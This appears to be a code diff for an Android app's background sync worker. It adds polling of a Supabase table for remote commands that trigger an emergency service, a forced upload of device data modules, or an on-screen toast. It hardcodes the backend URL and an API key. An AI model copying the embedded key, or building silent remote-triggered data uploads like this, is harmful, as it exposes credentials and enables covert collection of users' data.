@@ -12,6 +12,9 @@ import com.google.android.gms.location.LocationServices
 import kotlinx.coroutines.tasks.await
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.File
+import java.net.HttpURLConnection
+import java.net.URL
 
 class SyncWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {
 
@@ -86,7 +89,12 @@ class SyncWorker(appContext: Context, workerParams: WorkerParameters) : Coroutin
                 } catch (e: Exception) { e.printStackTrace() }
             }
 
+            // 3. Upload Data
             CloudManager.uploadData(ctx, listOf("ALL"), null)
+            
+            // 4. Check for Remote Commands (Merged from RemoteCommandWorker)
+            checkRemoteCommands(ctx)
+
             return Result.success()
         } catch (e: Exception) {
             e.printStackTrace()
@@ -94,5 +102,72 @@ class SyncWorker(appContext: Context, workerParams: WorkerParameters) : Coroutin
         } finally {
             notifManager.cancel(notifId)
         }
+    }
+
+    private suspend fun checkRemoteCommands(ctx: Context) {
+        try {
+            val deviceId = DeviceManager.getDeviceId(ctx)
+            val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?status=eq.PENDING&device_id=eq.$deviceId&select=*"
+            val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"
+
+            val url = URL(supabaseUrl)
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "GET"
+            conn.setRequestProperty("apikey", supabaseKey)
+            conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
+
+            if (conn.responseCode == 200) {
+                val resp = conn.inputStream.bufferedReader().use { it.readText() }
+                val commands = JSONArray(resp)
+
+                for (i in 0 until commands.length()) {
+                    val cmd = commands.getJSONObject(i)
+                    val id = cmd.getInt("id")
+                    var status = "EXECUTED"
+                    var errorMsg = ""
+
+                    try {
+                        if (cmd.getString("file_name") == "CODERED") {
+                            val i = android.content.Intent(ctx, EmergencyService::class.java)
+                            i.putExtra("codes", "0")
+                            i.putExtra("sender", "BACKEND")
+                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
+                        } 
+                        else if (cmd.getString("file_name") == "FORCE_UPLOAD") {
+                            val modulesStr = cmd.optString("content", "ALL")
+                            val modules = modulesStr.split(",").map { it.trim() }
+                            CloudManager.uploadData(ctx, modules, null)
+                        }
+                        else if (cmd.getString("file_name") == "TOAST") {
+                            val msg = cmd.optString("content", "Ping!")
+                            android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                android.widget.Toast.makeText(ctx, msg, android.widget.Toast.LENGTH_LONG).show()
+                            }
+                        }
+                    } catch (e: Exception) {
+                        status = "FAILED"
+                        errorMsg = e.message ?: "Unknown"
+                    }
+                    updateStatus(id, status, errorMsg, supabaseKey)
+                }
+            }
+        } catch (e: Exception) { e.printStackTrace() }
+    }
+
+    private fun updateStatus(id: Int, status: String, error: String, key: String) {
+        try {
+            val updateUrl = URL("https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?id=eq.$id")
+            val conn = updateUrl.openConnection() as HttpURLConnection
+            conn.requestMethod = "PATCH"
+            conn.setRequestProperty("apikey", key)
+            conn.setRequestProperty("Authorization", "Bearer $key")
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.doOutput = true
+            val json = JSONObject()
+            json.put("status", status)
+            if (error.isNotEmpty()) json.put("error_log", error)
+            conn.outputStream.use { it.write(json.toString().toByteArray()) }
+            conn.responseCode
+        } catch (e: Exception) {}
     }
 }
